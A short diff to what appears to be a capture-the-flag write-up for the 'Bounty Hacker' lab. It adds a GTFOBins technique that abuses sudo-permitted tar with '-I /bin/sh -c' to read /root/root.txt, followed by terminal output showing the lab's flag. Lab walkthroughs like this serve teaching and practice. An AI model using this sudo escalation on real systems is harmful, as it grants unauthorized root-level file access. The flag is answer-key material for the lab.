@@ -177,6 +177,11 @@ User lin may run the following commands on bountyhacker:
 
 ## By checking it to GTFO Bins we find, we can take advantage of it to read files as root
 ```
+LFILE=file_to_read
+tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
+```
+## So, By modifying this we read the root file
+```
 lin@bountyhacker:~/Desktop$ LFILE=/root/root.txt
 lin@bountyhacker:~/Desktop$ sudo tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
 THM{80UN7Y_h4cK3r}
